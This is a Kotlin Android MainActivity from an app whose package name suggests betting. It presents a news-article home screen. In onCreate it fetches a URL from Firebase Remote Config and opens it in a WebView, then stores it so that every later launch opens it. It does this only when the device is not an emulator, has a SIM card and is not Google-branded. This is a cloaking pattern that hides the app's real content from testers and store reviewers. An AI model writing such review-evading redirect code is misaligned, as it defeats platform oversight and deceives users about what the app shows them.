package stavka.stavki.games.ui

import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.telephony.TelephonyManager
import android.util.Log
import android.view.MenuItem
import android.view.View
import android.widget.Toast
import androidx.fragment.app.Fragment
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.ncapdevi.fragnav.FragNavController
import com.ncapdevi.fragnav.FragNavTransactionOptions
import org.koin.android.ext.android.inject
import org.koin.androidx.viewmodel.ext.android.viewModel
import stavka.stavki.games.R
import stavka.stavki.games.base.BaseActivity
import stavka.stavki.games.base.BaseFragment
import stavka.stavki.games.databinding.ActivityMainBinding
import stavka.stavki.games.model.Config
import stavka.stavki.games.util.Constant.Companion.API_ARTICLES_COUNT
import stavka.stavki.games.util.Constant.Companion.API_KEY
import stavka.stavki.games.util.Constant.Companion.API_RESULT_TYPE
import stavka.stavki.games.util.PreferenceManager
import java.util.*
import kotlin.system.exitProcess


class MainActivity : BaseActivity(), BaseFragment.FragmentNavigation,
    FragNavController.TransactionListener, FragNavController.RootFragmentListener {

    private lateinit var binding: ActivityMainBinding

    private val mainViewModel: MainViewModel by viewModel()

    private var doubleBackToExitPressedOnce = false

    private val fragNavController: FragNavController = FragNavController(supportFragmentManager, R.id.container)
    lateinit var mFirebaseRemoteConfig: FirebaseRemoteConfig

    val preferenceManager: PreferenceManager by inject()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        initFragNav(savedInstanceState)

        val apiConfig = Config(
            apiKey = API_KEY,
            resultType = API_RESULT_TYPE,
            articlesCount = API_ARTICLES_COUNT,
            query = resources.getString(R.string.query)
        )
        mainViewModel.loadIndex(apiConfig)

        mFirebaseRemoteConfig = FirebaseRemoteConfig.getInstance()

        if (preferenceManager.prefUrl.isNotEmpty()) {
            finishAffinity()
            val intent = Intent(applicationContext, WebActivity::class.java)
            intent.putExtra("url", preferenceManager.prefUrl)
            startActivity(intent)
        } else {
            mFirebaseRemoteConfig.fetchAndActivate().addOnCompleteListener {
                val url = mFirebaseRemoteConfig.getString("url")
                // val url = "https://google.com" // TEST

                if (url.isEmpty() || isEmulator() || !isSIMInserted() || isGoogleBrand()) {
                    Log.d("TAG", "No url")
                } else {
                    preferenceManager.prefUrl = url

                    val intent = Intent(applicationContext, WebActivity::class.java)
                    intent.putExtra("url", url)
                    startActivity(intent)
                    finishAffinity()
                }
            }
        }
    }

    private fun isSIMInserted(): Boolean {
        return TelephonyManager.SIM_STATE_ABSENT != (applicationContext.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager).simState
    }

    private fun isGoogleBrand(): Boolean {
        return Build.BRAND.contains("google")
    }

    private fun isEmulator(): Boolean {
        return (Build.MANUFACTURER.contains("Genymotion")
                || Build.MODEL.contains("google_sdk")
                || Build.MODEL.lowercase(Locale.getDefault()).contains("droid4x")
                || Build.MODEL.contains("Emulator")
                || Build.MODEL.contains("Android SDK built for x86")
                || Build.HARDWARE == "goldfish"
                || Build.HARDWARE == "vbox86"
                || Build.HARDWARE.lowercase(Locale.getDefault()).contains("nox")
                || Build.FINGERPRINT.startsWith("generic")
                || Build.PRODUCT == "sdk"
                || Build.PRODUCT == "google_sdk"
                || Build.PRODUCT == "sdk_x86"
                || Build.PRODUCT == "vbox86p"
                || Build.PRODUCT.lowercase(Locale.getDefault()).contains("nox")
                || Build.BOARD.lowercase(Locale.getDefault()).contains("nox")
                || (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic")))
    }

    private fun initFragNav(savedInstanceState: Bundle?) {
        fragNavController.apply {
            rootFragmentListener = this@MainActivity
            createEager = true
            fragmentHideStrategy = FragNavController.HIDE
        }
        fragNavController.initialize(0, savedInstanceState)
    }

    override fun onBackPressed() {
        if (supportFragmentManager.backStackEntryCount <= 0 || !supportFragmentManager.popBackStackImmediate()) {
            if (!this.fragNavController.isRootFragment) {
                if (this.fragNavController.popFragment(
                        FragNavTransactionOptions.newBuilder().build()
                    )
                )
                    return
            } else {
                setupBackPressedDispatcher()
            }
        }
    }

    private fun setupBackPressedDispatcher() {
        if (doubleBackToExitPressedOnce) {
            finishAffinity()
            exitProcess(0)
        }
        doubleBackToExitPressedOnce = true
        Toast.makeText(applicationContext, "Tap back button in order to exit", Toast.LENGTH_SHORT).show()
        Handler(Looper.getMainLooper()).postDelayed({ doubleBackToExitPressedOnce = false }, 2000)
    }

    override fun onOptionsItemSelected(item: MenuItem): Boolean {
        when (item.itemId) {
            android.R.id.home -> fragNavController.popFragment()
        }
        return true
    }

    override fun onSaveInstanceState(outState: Bundle) {
        super.onSaveInstanceState(outState)
        fragNavController.onSaveInstanceState(outState)
    }

    /****************************************************************************************************
     **  FragNav (BaseFragment interface implementation)
     ****************************************************************************************************/
    override fun clearStack() = fragNavController.clearStack()
    override fun pushFragment(fragment: Fragment, sharedElementList: List<Pair<View, String>>?) {
        val options = FragNavTransactionOptions.newBuilder()
        sharedElementList?.let {
            it.forEach { pair ->
                options.addSharedElement(pair)
            }
        }
        fragNavController.pushFragment(fragment, options.build())
    }

    override fun navigateBack() = this.onBackPressed()

    override fun navigateBack(i: Int) {
        if (!fragNavController.isRootFragment) {
            fragNavController.popFragments(i, FragNavTransactionOptions.newBuilder().build())
        }
    }

    override fun navigateBack(z: Boolean) {
        if (supportFragmentManager.backStackEntryCount > 0) {
            supportFragmentManager.popBackStack()
        }
    }

    override fun navigateTo(fragment: Fragment) = fragNavController.pushFragment(fragment, FragNavTransactionOptions.newBuilder().build())

    override val numberOfRootFragments: Int = 1

    override fun getRootFragment(index: Int): Fragment {
        when (index) {
            0 -> return HomeFragment()
        }
        throw IllegalStateException("Need to send an index that we know")
    }

    override fun onFragmentTransaction(
        fragment: Fragment?,
        transactionType: FragNavController.TransactionType
    ) {
        supportActionBar?.setDisplayHomeAsUpEnabled(fragNavController.isRootFragment.not())
    }

    override fun onTabTransaction(fragment: Fragment?, index: Int) {
        supportActionBar?.setDisplayHomeAsUpEnabled(fragNavController.isRootFragment.not())
    }
}